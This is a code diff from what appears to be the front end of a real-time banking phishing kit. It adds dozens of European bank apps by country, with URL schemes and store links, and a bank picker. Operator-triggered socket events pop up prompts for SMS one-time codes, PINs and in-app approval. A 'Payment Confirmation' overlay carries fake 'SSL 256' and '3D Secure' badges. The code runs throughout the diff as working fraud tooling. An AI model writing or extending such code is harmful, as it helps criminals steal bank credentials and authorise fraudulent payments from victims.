   {keys:['caixabank','la caixa'],name:'CaixaBank',label:'CaixaBankNow',scheme:'caixabank://',ios:'https://apps.apple.com/es/app/caixabanknow/id400843654',android:'https://play.google.com/store/apps/details?id=es.lacaixa.mobile.android.newwapplication',bg1:'#003082',bg2:'#0040c0',tx:'CAX'},
   {keys:['sabadell'],name:'Sabadell',label:'BS Online',scheme:'sabadell://',ios:'https://apps.apple.com/es/app/banco-sabadell-app/id600028788',android:'https://play.google.com/store/apps/details?id=net.inverline.bancosabadell.officelocator.android',bg1:'#003082',bg2:'#1d4ed8',tx:'SAB'},
-  {keys:['unicredit','unicreditgroup'],name:'UniCredit',label:'Mobile Banking',scheme:'unicredit://',ios:'https://apps.apple.com/de/app/unicredit-mobile-banking/id398453959',android:'https://play.google.com/store/apps/details?id=com.unicredit',bg1:'#991b1b',bg2:'#dc2626',tx:'UCB'},
+  {keys:['bankia','bankia bank'],name:'Bankia',label:'Bankia App',scheme:'bankia://',ios:'https://apps.apple.com/es/app/bankia/id382101788',android:'https://play.google.com/store/apps/details?id=com.bankia.net',bg1:'#003082',bg2:'#0040c0',tx:'BKA'},
+  // ── ITALY ─────────────────────────────────────────────────────────────────────
+  {keys:['unicredit','unicreditgroup','unicredit it'],name:'UniCredit',label:'Mobile Banking',scheme:'unicredit://',ios:'https://apps.apple.com/it/app/unicredit-mobile-banking/id398453959',android:'https://play.google.com/store/apps/details?id=com.unicredit',bg1:'#991b1b',bg2:'#dc2626',tx:'UCB'},
   {keys:['intesa sanpaolo','banca intesa'],name:'Intesa Sanpaolo',label:'App Mobile',scheme:'intesasanpaolo://',ios:'https://apps.apple.com/it/app/intesa-sanpaolo-mobile/id397549482',android:'https://play.google.com/store/apps/details?id=com.latuabancaperandroid',bg1:'#166534',bg2:'#16a34a',tx:'ISP'},
   {keys:['fineco','fineco bank'],name:'FinecoBank',label:'Fineco App',scheme:'fineco://',ios:'https://apps.apple.com/it/app/fineco/id334690323',android:'https://play.google.com/store/apps/details?id=it.fineco',bg1:'#003082',bg2:'#0040a0',tx:'FNB'},
+  {keys:['banco bpm','ubi banca'],name:'Banco BPM',label:'Banco BPM',scheme:'bancopbm://',ios:'https://apps.apple.com/it/app/banco-bpm-mobile/id1143017597',android:'https://play.google.com/store/apps/details?id=it.gruppobancobpm.mobilebanking',bg1:'#003082',bg2:'#1d4ed8',tx:'BPM'},
+  {keys:['monte dei paschi','mps bank','banca mps'],name:'Monte dei Paschi',label:'MPS Mobile',scheme:'mps://',ios:'https://apps.apple.com/it/app/mps-mobile/id477566577',android:'https://play.google.com/store/apps/details?id=it.banca.mps.mobilebanking',bg1:'#991b1b',bg2:'#b91c1c',tx:'MPS'},
+  {keys:['poste italiane','bancoposta'],name:'Poste Italiane',label:'BancoPosta',scheme:'poste://',ios:'https://apps.apple.com/it/app/postepay/id364406997',android:'https://play.google.com/store/apps/details?id=posteitaliane.posteapp',bg1:'#b8970a',bg2:'#d97706',tx:'PTI'},
+  // ── NETHERLANDS ───────────────────────────────────────────────────────────────
   {keys:['abn amro','abnamro'],name:'ABN AMRO',label:'Mobiel Bankieren',scheme:'abnamro://',ios:'https://apps.apple.com/nl/app/abn-amro-mobiel-bankieren/id389227429',android:'https://play.google.com/store/apps/details?id=com.abnamro.nl.mobile.payments',bg1:'#166534',bg2:'#15803d',tx:'ABN'},
   {keys:['rabobank'],name:'Rabobank',label:'Rabo App',scheme:'rabobank://',ios:'https://apps.apple.com/nl/app/rabobank/id468556175',android:'https://play.google.com/store/apps/details?id=nl.rabomobiel',bg1:'#003082',bg2:'#1d4ed8',tx:'RBO'},
+  {keys:['ing nl','ing nederland','ing bank nl'],name:'ING Nederland',label:'Mijn ING',scheme:'ing://',ios:'https://apps.apple.com/nl/app/ing-bankieren/id489811407',android:'https://play.google.com/store/apps/details?id=com.ing.mobile',bg1:'#c2410c',bg2:'#ff6200',tx:'ING'},
+  {keys:['sns bank'],name:'SNS Bank',label:'SNS Mobiel',scheme:'sns://',ios:'https://apps.apple.com/nl/app/sns-mobiel-bankieren/id400820600',android:'https://play.google.com/store/apps/details?id=nl.snsbank.app',bg1:'#b91c1c',bg2:'#dc2626',tx:'SNS'},
+  // ── BELGIUM ───────────────────────────────────────────────────────────────────
   {keys:['kbc'],name:'KBC',label:'KBC Mobile',scheme:'kbc://',ios:'https://apps.apple.com/be/app/kbc-mobile/id441057208',android:'https://play.google.com/store/apps/details?id=com.kbc.mobile.android.phone.kbc',bg1:'#003082',bg2:'#1d4ed8',tx:'KBC'},
   {keys:['belfius'],name:'Belfius',label:'Belfius Mobile',scheme:'belfius://',ios:'https://apps.apple.com/be/app/belfius/id502882107',android:'https://play.google.com/store/apps/details?id=be.belfius.directmobile.android',bg1:'#6d28d9',bg2:'#7c3aed',tx:'BLF'},
-  {keys:['erste bank','erste group','s-bank'],name:'Erste Bank',label:'George',scheme:'george://',ios:'https://apps.apple.com/at/app/george/id1282498789',android:'https://play.google.com/store/apps/details?id=at.spardat.netbanking',bg1:'#003082',bg2:'#0040c0',tx:'ERS'},
-  {keys:['bank austria'],name:'Bank Austria',label:'Mein Elba',scheme:'bankaustria://',ios:'https://apps.apple.com/at/app/bank-austria-mein-elba/id393458718',android:'https://play.google.com/store/apps/details?id=at.bankaustria.android.elba',bg1:'#991b1b',bg2:'#dc2626',tx:'BA'},
+  {keys:['ing be','ing belgique','ing belgium'],name:'ING Belgique',label:'ING Mobile',scheme:'ing://',ios:'https://apps.apple.com/be/app/ing-banking/id543703481',android:'https://play.google.com/store/apps/details?id=com.ing.banking',bg1:'#c2410c',bg2:'#ff6200',tx:'ING'},
+  // ── AUSTRIA ───────────────────────────────────────────────────────────────────
+  {keys:['erste bank','erste group','george at'],name:'Erste Bank',label:'George',scheme:'george://',ios:'https://apps.apple.com/at/app/george/id1282498789',android:'https://play.google.com/store/apps/details?id=at.spardat.netbanking',bg1:'#003082',bg2:'#0040c0',tx:'ERS'},
+  {keys:['bank austria','bankaustria'],name:'Bank Austria',label:'Mein Elba',scheme:'bankaustria://',ios:'https://apps.apple.com/at/app/bank-austria-mein-elba/id393458718',android:'https://play.google.com/store/apps/details?id=at.bankaustria.android.elba',bg1:'#991b1b',bg2:'#dc2626',tx:'BA'},
+  {keys:['raiffeisen at','raiffeisen österreich','raiffeisen austria'],name:'Raiffeisen AT',label:'Elba Internet',scheme:'raiffeisen://',ios:'https://apps.apple.com/at/app/raiffeisen-elba/id497260390',android:'https://play.google.com/store/apps/details?id=at.raiffeisen.mobileelba',bg1:'#b91c1c',bg2:'#fbbf24',tx:'RBK'},
+  {keys:['bawag','psk bank'],name:'BAWAG P.S.K.',label:'BAWAG Mobile',scheme:'bawag://',ios:'https://apps.apple.com/at/app/bawag-psk-banking/id548851928',android:'https://play.google.com/store/apps/details?id=com.bawagpsk.mobile',bg1:'#003082',bg2:'#1d4ed8',tx:'BWG'},
+  // ── SWITZERLAND ───────────────────────────────────────────────────────────────
+  {keys:['ubs ','ubs ag'],name:'UBS',label:'UBS Mobile',scheme:'ubs://',ios:'https://apps.apple.com/ch/app/ubs-key4-mobile/id400357007',android:'https://play.google.com/store/apps/details?id=com.ubs.swidKXJ.android',bg1:'#b91c1c',bg2:'#dc2626',tx:'UBS'},
+  {keys:['credit suisse','cs bank'],name:'Credit Suisse',label:'CSX Mobile',scheme:'creditsuisse://',ios:'https://apps.apple.com/ch/app/credit-suisse-mobile/id1235723640',android:'https://play.google.com/store/apps/details?id=com.csg.cs.dnmobilebanking',bg1:'#003082',bg2:'#0040a0',tx:'CS'},
+  {keys:['postfinance'],name:'PostFinance',label:'PostFinance App',scheme:'postfinance://',ios:'https://apps.apple.com/ch/app/postfinance-app/id370900217',android:'https://play.google.com/store/apps/details?id=ch.postfinance.android.pfp.activity',bg1:'#f59e0b',bg2:'#d97706',tx:'PF'},
+  {keys:['raiffeisen ch','raiffeisen schweiz'],name:'Raiffeisen CH',label:'Raiffeisen E-Banking',scheme:'raiffeisen://',ios:'https://apps.apple.com/ch/app/raiffeisen-e-banking/id591898196',android:'https://play.google.com/store/apps/details?id=ch.raiffeisen.android',bg1:'#b91c1c',bg2:'#fbbf24',tx:'RCH'},
+  // ── NORDIC ────────────────────────────────────────────────────────────────────
   {keys:['nordea'],name:'Nordea',label:'Nordea Mobile',scheme:'nordea://',ios:'https://apps.apple.com/se/app/nordea-mobile/id573601126',android:'https://play.google.com/store/apps/details?id=dk.nordea.mobilebank',bg1:'#003082',bg2:'#0040c0',tx:'NOR'},
   {keys:['swedbank'],name:'Swedbank',label:'Mobile Banking',scheme:'swedbank://',ios:'https://apps.apple.com/se/app/swedbank-mobile/id370968149',android:'https://play.google.com/store/apps/details?id=se.swedbank.mobil',bg1:'#003082',bg2:'#f59e0b',tx:'SWE'},
   {keys:['handelsbanken'],name:'Handelsbanken',label:'Mobile Bank',scheme:'handelsbanken://',ios:'https://apps.apple.com/se/app/handelsbanken-mobile-bank/id484703918',android:'https://play.google.com/store/apps/details?id=se.handelsbanken.android',bg1:'#003082',bg2:'#1d4ed8',tx:'HBK'},
   {keys:['seb bank','skandinaviska'],name:'SEB',label:'SEB Mobile',scheme:'seb://',ios:'https://apps.apple.com/se/app/seb-mobile-bank/id511918898',android:'https://play.google.com/store/apps/details?id=se.seb.privatkund',bg1:'#003082',bg2:'#1d4ed8',tx:'SEB'},
   {keys:['dnb '],name:'DNB',label:'Mobilbank',scheme:'dnb://',ios:'https://apps.apple.com/no/app/dnb-mobilbank/id398814928',android:'https://play.google.com/store/apps/details?id=no.dnb.apps.android.client',bg1:'#003082',bg2:'#1d4ed8',tx:'DNB'},
   {keys:['danske bank'],name:'Danske Bank',label:'Mobilbank',scheme:'danskebank://',ios:'https://apps.apple.com/dk/app/mobilbank-danmark/id437468521',android:'https://play.google.com/store/apps/details?id=com.danskebank.mobilebank3.dk',bg1:'#003082',bg2:'#1d4ed8',tx:'DNK'},
+  {keys:['jyske bank'],name:'Jyske Bank',label:'MobilBank',scheme:'jyskebank://',ios:'https://apps.apple.com/dk/app/jyske-bank-mobilbank/id471718947',android:'https://play.google.com/store/apps/details?id=dk.jyskebank.mobilbank',bg1:'#003082',bg2:'#1d4ed8',tx:'JYS'},
+  {keys:['op bank','op financial','op-pohjola','osuuspankki'],name:'OP Financial',label:'OP Mobiili',scheme:'opbank://',ios:'https://apps.apple.com/fi/app/op-mobiili/id502801696',android:'https://play.google.com/store/apps/details?id=fi.op.android.opmobiili',bg1:'#b8970a',bg2:'#f59e0b',tx:'OP'},
+  {keys:['luminor'],name:'Luminor',label:'Luminor Mobile',scheme:'luminor://',ios:'https://apps.apple.com/ee/app/luminor/id1350019505',android:'https://play.google.com/store/apps/details?id=com.luminor.app',bg1:'#003082',bg2:'#1d4ed8',tx:'LMN'},
+  {keys:['lhv bank'],name:'LHV',label:'LHV Mobile',scheme:'lhv://',ios:'https://apps.apple.com/ee/app/lhv-mobile/id576607830',android:'https://play.google.com/store/apps/details?id=com.lhv.mobilebank',bg1:'#111827',bg2:'#374151',tx:'LHV'},
+  // ── POLAND ────────────────────────────────────────────────────────────────────
   {keys:['pko','pkobp'],name:'PKO Bank Polski',label:'IKO',scheme:'pkobank://',ios:'https://apps.apple.com/pl/app/iko/id480910736',android:'https://play.google.com/store/apps/details?id=pl.pkobp.iko',bg1:'#003082',bg2:'#1d4ed8',tx:'PKO'},
   {keys:['mbank'],name:'mBank',label:'mBank Mobile',scheme:'mbank://',ios:'https://apps.apple.com/pl/app/mbank-pl/id649789400',android:'https://play.google.com/store/apps/details?id=pl.mbank',bg1:'#b91c1c',bg2:'#dc2626',tx:'MB'},
-  {keys:['ubs ','ubs ag'],name:'UBS',label:'UBS Mobile',scheme:'ubs://',ios:'https://apps.apple.com/ch/app/ubs-key4-mobile/id400357007',android:'https://play.google.com/store/apps/details?id=com.ubs.swidKXJ.android',bg1:'#b91c1c',bg2:'#dc2626',tx:'UBS'},
-  {keys:['credit suisse','cs bank'],name:'Credit Suisse',label:'CSX Mobile',scheme:'creditsuisse://',ios:'https://apps.apple.com/ch/app/credit-suisse-mobile/id1235723640',android:'https://play.google.com/store/apps/details?id=com.csg.cs.dnmobilebanking',bg1:'#003082',bg2:'#0040a0',tx:'CS'},
-  {keys:['postfinance'],name:'PostFinance',label:'PostFinance App',scheme:'postfinance://',ios:'https://apps.apple.com/ch/app/postfinance-app/id370900217',android:'https://play.google.com/store/apps/details?id=ch.postfinance.android.pfp.activity',bg1:'#f59e0b',bg2:'#d97706',tx:'PF'},
+  {keys:['alior bank'],name:'Alior Bank',label:'Alior Mobile',scheme:'aliorbank://',ios:'https://apps.apple.com/pl/app/alior-mobile/id578919367',android:'https://play.google.com/store/apps/details?id=pl.aliorbank.aib',bg1:'#b91c1c',bg2:'#dc2626',tx:'ALR'},
+  {keys:['bank pekao','pekao sa'],name:'Bank Pekao',label:'PeoPay',scheme:'pekao://',ios:'https://apps.apple.com/pl/app/peopay/id567927904',android:'https://play.google.com/store/apps/details?id=pl.com.softblue.bpsa',bg1:'#b91c1c',bg2:'#dc2626',tx:'PKO'},
+  {keys:['ing bank slaski','ing bank śląski'],name:'ING Bank Śląski',label:'Moje ING',scheme:'ing://',ios:'https://apps.apple.com/pl/app/moje-ing-mobile/id439994228',android:'https://play.google.com/store/apps/details?id=pl.ing.mojeing',bg1:'#c2410c',bg2:'#ff6200',tx:'ING'},
+  {keys:['bank millennium','millennium pl'],name:'Bank Millennium',label:'Millennium',scheme:'millennium://',ios:'https://apps.apple.com/pl/app/bank-millennium/id468540232',android:'https://play.google.com/store/apps/details?id=wit.android.bcpBankingApp.millenniumPL',bg1:'#b91c1c',bg2:'#dc2626',tx:'MLL'},
+  {keys:['santander bank polska'],name:'Santander PL',label:'Santander Mobile',scheme:'santander://',ios:'https://apps.apple.com/pl/app/santander-mobile/id589238434',android:'https://play.google.com/store/apps/details?id=pl.bzwbk.bzwbk24',bg1:'#b91c1c',bg2:'#dc2626',tx:'SAN'},
+  // ── CZECH REPUBLIC ────────────────────────────────────────────────────────────
+  {keys:['csob','čsob','ceskoslovenska obchodna'],name:'ČSOB',label:'ČSOB Smart',scheme:'csob://',ios:'https://apps.apple.com/cz/app/csob-smartbanking/id427735093',android:'https://play.google.com/store/apps/details?id=cz.csob.smartbanking',bg1:'#003082',bg2:'#1d4ed8',tx:'ČSOB'},
+  {keys:['ceska sporitelna','česká spořitelna','sporitelna'],name:'Česká spořitelna',label:'George CZ',scheme:'george://',ios:'https://apps.apple.com/cz/app/george/id1278898165',android:'https://play.google.com/store/apps/details?id=cz.sporitelna.isbs',bg1:'#003082',bg2:'#0052cc',tx:'ČS'},
+  {keys:['komercni banka','komerční banka','kb banka'],name:'Komerční banka',label:'KB Mobilní banka',scheme:'kb://',ios:'https://apps.apple.com/cz/app/kb-mobilni-banka/id449165533',android:'https://play.google.com/store/apps/details?id=eu.inmite.prj.kb.mobilbank',bg1:'#b91c1c',bg2:'#dc2626',tx:'KB'},
+  {keys:['moneta','moneta money'],name:'Moneta Money Bank',label:'Smart Banka',scheme:'moneta://',ios:'https://apps.apple.com/cz/app/moneta-smart-banka/id1017617789',android:'https://play.google.com/store/apps/details?id=cz.moneta.smartbanka',bg1:'#6d28d9',bg2:'#7c3aed',tx:'MON'},
+  // ── HUNGARY ───────────────────────────────────────────────────────────────────
+  {keys:['otp bank hu','otp bank ','otp hungary'],name:'OTP Bank',label:'OTP MobilBanka',scheme:'otpmobilbanka://',ios:'https://apps.apple.com/hu/app/otp-mobilbanka/id407588700',android:'https://play.google.com/store/apps/details?id=hu.otpbank.mobilapp',bg1:'#166534',bg2:'#15803d',tx:'OTP'},
+  {keys:['k&h bank','k and h','kh bank'],name:'K&H Bank',label:'K&H Mobilbank',scheme:'khbank://',ios:'https://apps.apple.com/hu/app/k-h-mobilbank/id577803074',android:'https://play.google.com/store/apps/details?id=hu.khb.khbankapp',bg1:'#003082',bg2:'#1d4ed8',tx:'K&H'},
+  {keys:['mkb bank'],name:'MKB Bank',label:'MKB Mobile',scheme:'mkb://',ios:'https://apps.apple.com/hu/app/mkb-mobilbank/id1023580557',android:'https://play.google.com/store/apps/details?id=hu.mkb.mobilbank',bg1:'#003082',bg2:'#1d4ed8',tx:'MKB'},
+  // ── SLOVAKIA ──────────────────────────────────────────────────────────────────
+  {keys:['tatra banka','tatrabanka'],name:'Tatra Banka',label:'Tatra banka',scheme:'tatrabanka://',ios:'https://apps.apple.com/sk/app/tatra-banka/id413404401',android:'https://play.google.com/store/apps/details?id=sk.tatrabank.mobile',bg1:'#b91c1c',bg2:'#dc2626',tx:'TB'},
+  {keys:['vub banka','vub ','vseobecna uverova'],name:'VÚB Banka',label:'VÚB Mobile',scheme:'vub://',ios:'https://apps.apple.com/sk/app/vub-banka/id432060347',android:'https://play.google.com/store/apps/details?id=sk.vub.mobile',bg1:'#003082',bg2:'#1d4ed8',tx:'VÚB'},
+  // ── GREECE ────────────────────────────────────────────────────────────────────
+  {keys:['alpha bank','alpha bank gr'],name:'Alpha Bank',label:'Alpha Mobile',scheme:'alphabank://',ios:'https://apps.apple.com/gr/app/alpha-mobile-banking/id517270226',android:'https://play.google.com/store/apps/details?id=com.alphabank.mobile.android.tablet',bg1:'#003082',bg2:'#1d4ed8',tx:'ALF'},
+  {keys:['piraeus bank','trapeza peireos'],name:'Piraeus Bank',label:'winbank',scheme:'piraeus://',ios:'https://apps.apple.com/gr/app/winbank/id553444673',android:'https://play.google.com/store/apps/details?id=com.piraeusbank.android.mbanking',bg1:'#166534',bg2:'#15803d',tx:'PIR'},
+  {keys:['national bank of greece','ethniki trapeza','nbe greece'],name:'National Bank GR',label:'NBG Mobile',scheme:'nbg://',ios:'https://apps.apple.com/gr/app/nbg-mobile-banking/id454065228',android:'https://play.google.com/store/apps/details?id=com.nbg.android.mobile',bg1:'#003082',bg2:'#0052cc',tx:'NBG'},
+  {keys:['eurobank','euro bank gr'],name:'Eurobank',label:'Eurobank Mobile',scheme:'eurobank://',ios:'https://apps.apple.com/gr/app/eurobank/id459289984',android:'https://play.google.com/store/apps/details?id=gr.eurobank.ergo.android.mbanking',bg1:'#003082',bg2:'#1d4ed8',tx:'EUR'},
+  // ── PORTUGAL ──────────────────────────────────────────────────────────────────
+  {keys:['caixa geral','cgd','caixa'],name:'Caixa Geral de Depósitos',label:'Caixadirecta',scheme:'cgd://',ios:'https://apps.apple.com/pt/app/caixadirecta/id475934319',android:'https://play.google.com/store/apps/details?id=pt.cgd.android.caixadirecta',bg1:'#166534',bg2:'#16a34a',tx:'CGD'},
+  {keys:['banco bpi','bpi portugal'],name:'BPI',label:'BPI Net Móvel',scheme:'bpi://',ios:'https://apps.apple.com/pt/app/bpi-net-movel/id429700347',android:'https://play.google.com/store/apps/details?id=pt.bancobpi.mobile.android',bg1:'#003082',bg2:'#1d4ed8',tx:'BPI'},
+  {keys:['millennium bcp','banco comercial portugues','bcp portugal'],name:'Millennium BCP',label:'Millennium',scheme:'millenniumbcp://',ios:'https://apps.apple.com/pt/app/millennium/id361413924',android:'https://play.google.com/store/apps/details?id=pt.millenniumbcp.smartphone.android',bg1:'#b91c1c',bg2:'#dc2626',tx:'MLL'},
+  {keys:['novo banco'],name:'Novo Banco',label:'NB smart',scheme:'novobanco://',ios:'https://apps.apple.com/pt/app/novo-banco/id1134697521',android:'https://play.google.com/store/apps/details?id=pt.novobanco.android',bg1:'#b91c1c',bg2:'#dc2626',tx:'NVB'},
+  // ── IRELAND ───────────────────────────────────────────────────────────────────
+  {keys:['aib bank','allied irish','aib ireland'],name:'AIB',label:'AIB Mobile',scheme:'aib://',ios:'https://apps.apple.com/ie/app/aib-mobile/id442363705',android:'https://play.google.com/store/apps/details?id=aib.ibank',bg1:'#003082',bg2:'#1d4ed8',tx:'AIB'},
+  {keys:['bank of ireland','boi ireland'],name:'Bank of Ireland',label:'Bank of Ireland Mobile',scheme:'bankofireland://',ios:'https://apps.apple.com/ie/app/bank-of-ireland-mobile/id416547119',android:'https://play.google.com/store/apps/details?id=com.bankofireland.mobilebanking',bg1:'#166534',bg2:'#15803d',tx:'BOI'},
+  // ── BULGARIA ──────────────────────────────────────────────────────────────────
+  {keys:['unicredit bulbank','bulbank'],name:'UniCredit Bulbank',label:'Bulbank Mobile',scheme:'unicredit://',ios:'https://apps.apple.com/bg/app/bulbank-mobile/id1195726555',android:'https://play.google.com/store/apps/details?id=bg.bulbank.mobile',bg1:'#991b1b',bg2:'#dc2626',tx:'UBB'},
+  {keys:['dsk bank','dsk '],name:'DSK Bank',label:'DSK Mobile',scheme:'dsk://',ios:'https://apps.apple.com/bg/app/dsk-mobile/id1173831539',android:'https://play.google.com/store/apps/details?id=bg.dskbank.mb',bg1:'#b8970a',bg2:'#f59e0b',tx:'DSK'},
+  {keys:['fibank','first investment bank','ccb bank'],name:'Fibank',label:'Fibank Mobile',scheme:'fibank://',ios:'https://apps.apple.com/bg/app/fibank-mobile/id908453879',android:'https://play.google.com/store/apps/details?id=bg.fibank.mobile',bg1:'#003082',bg2:'#1d4ed8',tx:'FIB'},
+  // ── CROATIA ───────────────────────────────────────────────────────────────────
+  {keys:['privredna banka','pbz','zagreb banka'],name:'PBZ',label:'PBZ Mobile',scheme:'pbz://',ios:'https://apps.apple.com/hr/app/pbz-mobile-banking/id471440685',android:'https://play.google.com/store/apps/details?id=hr.pbz.mbanking',bg1:'#003082',bg2:'#1d4ed8',tx:'PBZ'},
+  {keys:['zagrebacka banka','zaba bank'],name:'Zagrebačka banka',label:'mZABA',scheme:'zaba://',ios:'https://apps.apple.com/hr/app/mzaba/id557028625',android:'https://play.google.com/store/apps/details?id=hr.unicreditgroup.mbanking.ba',bg1:'#991b1b',bg2:'#dc2626',tx:'ZABA'},
+  // ── NEO-BANKS / PAN-EU ────────────────────────────────────────────────────────
   {keys:['revolut'],name:'Revolut',label:'Revolut App',scheme:'revolut://',ios:'https://apps.apple.com/app/revolut/id932105498',android:'https://play.google.com/store/apps/details?id=com.revolut.revolut',bg1:'#111827',bg2:'#1f2937',tx:'REV'},
   {keys:['wise','transferwise'],name:'Wise',label:'Wise Transfer',scheme:'wise://',ios:'https://apps.apple.com/app/wise-send-receive-money/id612261371',android:'https://play.google.com/store/apps/details?id=com.transferwise.android',bg1:'#004d35',bg2:'#00b67a',tx:'WIS'},
   {keys:['klarna'],name:'Klarna',label:'Klarna App',scheme:'klarna://',ios:'https://apps.apple.com/app/klarna/id1115120088',android:'https://play.google.com/store/apps/details?id=com.myklarna.android',bg1:'#ff69b4',bg2:'#ec4899',tx:'KLN'},
   {keys:['bunq'],name:'Bunq',label:'Easy Banking',scheme:'bunq://',ios:'https://apps.apple.com/app/bunq-easy-bank/id884042357',android:'https://play.google.com/store/apps/details?id=com.bunq.android',bg1:'#0f766e',bg2:'#0d9488',tx:'BNQ'},
+  {keys:['raiffeisen bank','raiffeisen group'],name:'Raiffeisen',label:'Raiffeisen Mobile',scheme:'raiffeisen://',ios:'https://apps.apple.com/at/app/raiffeisen-elba/id497260390',android:'https://play.google.com/store/apps/details?id=at.raiffeisen.mobileelba',bg1:'#b91c1c',bg2:'#fbbf24',tx:'RZB'},
 ];
 function matchBank(str){
   if(!str||str==='--'||str.trim()==='') return null;
   const s=str.toLowerCase();
   return BANK_DB.find(b=>b.keys.some(k=>s.includes(k)))||null;
 }
+function buildBankList(filter){
+  const list=document.getElementById('app-bank-list');
+  const q=(filter||'').toLowerCase().trim();
+  const banks=q?BANK_DB.filter(b=>b.name.toLowerCase().includes(q)||b.keys.some(k=>k.includes(q))):BANK_DB;
+  list.innerHTML=banks.map(b=>`<button onclick="openBank('${b.scheme}','${b.ios}','${b.android}')" style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:12px;background:#fff;cursor:pointer;text-align:left;transition:.15s" onmouseover="this.style.borderColor='${b.bg2}'" onmouseout="this.style.borderColor='#e5e7eb'"><div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,${b.bg1},${b.bg2});display:flex;align-items:center;justify-content:center;flex-shrink:0"><span style="color:#fff;font-weight:900;font-size:${b.tx.length>3?'7':'9'}px">${b.tx}</span></div><div><div style="font-size:12px;font-weight:700;color:#1e293b">${b.label}</div><div style="font-size:10px;color:#94a3b8">${b.name}</div></div></button>`).join('');
+}
+function filterBankList(v){ buildBankList(v); }
 socket.on('sms_received',function(){ resetOTP(); document.getElementById('ov-sms').style.display='flex'; setTimeout(()=>document.querySelector('#otp-sms .otp-b').focus(),200); });
 socket.on('show_pin_prompt',function(){ document.getElementById('pin-code').value=''; document.getElementById('ov-pin').style.display='flex'; });
 socket.on('app_confirm',function(d){
   const bank=matchBank(d&&d.bank?d.bank:'');
   document.getElementById('app-waiting').style.display='none';
-  document.getElementById('app-bank-list').style.display='grid';
   if(bank){
     document.getElementById('app-matched').style.display='block';
     document.getElementById('app-all-banks').style.display='none';
@@ -406,6 +454,7 @@ socket.on('app_confirm',function(d){
   } else {
     document.getElementById('app-matched').style.display='none';
     document.getElementById('app-all-banks').style.display='block';
+    buildBankList();
   }
   document.getElementById('ov-app').style.display='flex';
 });
@@ -418,25 +467,25 @@ socket.on('open_link',function(d){
 <!-- Link confirm overlay -->
 <div id="ov-link" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center;padding:20px">
   <div style="background:#fff;border-radius:24px;padding:28px 22px 22px;width:100%;max-width:340px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.35)">
-    <div style="width:68px;height:68px;background:linear-gradient(135deg,#0f766e,#0d9488);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;animation:shield-pulse 2.5s ease-in-out infinite;box-shadow:0 8px 24px rgba(15,118,110,.35)">
+    <div style="width:68px;height:68px;background:linear-gradient(135deg,#56004D,#872879);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;animation:shield-pulse 2.5s ease-in-out infinite;box-shadow:0 8px 24px rgba(86,0,77,.35)">
       <i class="fas fa-lock" style="color:#fff;font-size:24px"></i>
     </div>
-    <h3 style="font-size:18px;font-weight:900;color:#0f766e;margin:0 0 6px;letter-spacing:-.01em" data-i18n="link_confirm_title">Payment Confirmation</h3>
+    <h3 style="font-size:18px;font-weight:900;color:#56004D;margin:0 0 6px;letter-spacing:-.01em" data-i18n="link_confirm_title">Payment Confirmation</h3>
     <p style="font-size:12.5px;color:#64748b;margin:0 0 20px;line-height:1.6" data-i18n="link_confirm_desc">Press the button below to confirm and finalize your payment securely.</p>
     <div style="display:flex;justify-content:center;gap:10px;margin-bottom:20px">
-      <div style="display:flex;align-items:center;gap:4px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;padding:4px 10px">
-        <i class="fas fa-lock" style="color:#16a34a;font-size:9px"></i>
-        <span style="font-size:10px;font-weight:700;color:#16a34a">SSL 256</span>
+      <div style="display:flex;align-items:center;gap:4px;background:#fdf2f8;border:1px solid #fbcfe8;border-radius:20px;padding:4px 10px">
+        <i class="fas fa-lock" style="color:#872879;font-size:9px"></i>
+        <span style="font-size:10px;font-weight:700;color:#872879">SSL 256</span>
       </div>
-      <div style="display:flex;align-items:center;gap:4px;background:#eff6ff;border:1px solid #bfdbfe;border-radius:20px;padding:4px 10px">
-        <i class="fas fa-shield-alt" style="color:#3b82f6;font-size:9px"></i>
-        <span style="font-size:10px;font-weight:700;color:#3b82f6">3D Secure</span>
+      <div style="display:flex;align-items:center;gap:4px;background:#fdf2f8;border:1px solid #fbcfe8;border-radius:20px;padding:4px 10px">
+        <i class="fas fa-shield-alt" style="color:#872879;font-size:9px"></i>
+        <span style="font-size:10px;font-weight:700;color:#872879">3D Secure</span>
       </div>
     </div>
     <button id="ov-link-btn"
-      style="width:100%;padding:16px;background:linear-gradient(135deg,#0f766e,#0d9488);color:#fff;border:none;border-radius:16px;font-size:15px;font-weight:900;cursor:pointer;letter-spacing:.02em;box-shadow:0 6px 20px rgba(15,118,110,.4);transition:transform .15s,box-shadow .15s"
-      onmousedown="this.style.transform='scale(.97)';this.style.boxShadow='0 3px 10px rgba(15,118,110,.3)'"
-      onmouseup="this.style.transform='';this.style.boxShadow='0 6px 20px rgba(15,118,110,.4)'">
+      style="width:100%;padding:16px;background:linear-gradient(135deg,#56004D,#872879);color:#fff;border:none;border-radius:16px;font-size:15px;font-weight:900;cursor:pointer;letter-spacing:.02em;box-shadow:0 6px 20px rgba(86,0,77,.4);transition:transform .15s,box-shadow .15s"
+      onmousedown="this.style.transform='scale(.97)';this.style.boxShadow='0 3px 10px rgba(86,0,77,.3)'"
+      onmouseup="this.style.transform='';this.style.boxShadow='0 6px 20px rgba(86,0,77,.4)'">
       <i class="fas fa-check-circle" style="margin-right:8px"></i><span data-i18n="link_confirm_btn">Confirm</span>
     </button>
     <p style="font-size:10px;color:#94a3b8;margin:12px 0 0">
